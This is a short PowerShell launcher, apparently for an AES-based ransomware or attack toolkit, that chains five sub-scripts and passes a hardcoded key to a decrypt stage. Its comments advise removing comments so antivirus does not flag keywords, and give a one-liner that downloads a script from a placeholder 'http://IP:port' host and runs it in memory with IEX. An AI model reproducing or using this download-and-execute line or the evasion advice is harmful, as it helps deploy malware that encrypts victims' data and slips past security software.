#exranAES.ps1

# Execute the parts in succession
# Make sure to remove all comments before execution so spcific words are not picked up by AV
# Can also be run in memory using  (New-Object System.Net.WebClient).DownloadString('http://IP:port/exran.ps1') | IEX
# Ensure the below files are modified with the http download location if running from memory

# If the shell doesnt execute check the variables as decribed in the relvant file, manually setting the variable can also be used


. .\ran1.ps1
. .\ran2.ps1
. .\ran3-AEScode.ps1
. .\ran4-AESdecrypt.ps1 "MySecretKey123"
. .\ran5.ps1